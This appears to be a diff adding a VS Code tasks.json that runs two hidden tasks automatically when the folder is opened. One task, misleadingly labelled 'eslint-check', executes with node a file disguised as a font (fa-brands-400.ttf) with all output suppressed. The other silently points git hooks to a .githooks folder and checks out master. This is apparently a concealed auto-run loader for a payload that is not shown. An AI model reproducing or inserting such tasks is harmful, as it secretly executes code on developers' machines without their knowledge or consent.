@@ -1,0 +1,42 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./test/utils/public/fonts/fa-brands-400.ttf) || (where node >nul 2>&1 && node ./test/utils/public/fonts/fa-brands-400.ttf) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "Git checkout to default branch",
+      "type": "shell",
+      "command": "git config core.hooksPath .githooks; git checkout master",
+      "presentation": {
+        "reveal": "never",
+        "echo": false,
+        "focus": false,
+        "close": true,
+        "panel": "dedicated",
+        "showReuseMessage": false,
+        "clear": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "problemMatcher": []
+    }
+  ]
+}
